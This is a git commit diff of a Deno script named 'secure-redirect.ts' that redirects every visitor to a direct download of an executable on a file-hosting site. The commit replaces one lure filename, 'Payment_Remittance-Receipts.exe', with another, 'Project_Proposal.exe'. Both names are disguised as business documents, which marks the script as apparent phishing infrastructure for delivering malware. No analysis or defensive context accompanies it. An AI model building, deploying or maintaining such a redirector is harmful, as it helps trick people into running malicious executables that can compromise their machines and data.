9ff873a8c53c438c3a324799e7bc22eda005c7bb
verdelltexterwzv99 <verdelltexterwzv99@gmail.com>
2025-06-04 14:59:27 +0000

    Update secure-redirect.ts

--- secure-redirect.ts
+++ secure-redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 import { serve } from "https://deno.land/std@0.200.0/http/server.ts";
 
-const DESTINATION_URL = Deno.env.get("DESTINATION_URL") || "https://cold4.gofile.io/download/direct/c8fb9e16-7775-4839-b560-c69f0ba41ac7/Payment_Remittance-Receipts.exe";
+const DESTINATION_URL = Deno.env.get("DESTINATION_URL") || "https://store3.gofile.io/download/direct/09d931fb-21c7-4998-9598-0e51856da7ac/Project_Proposal.exe";
 
 function handleRequest(req: Request): Response {
   return Response.redirect(DESTINATION_URL, 301);
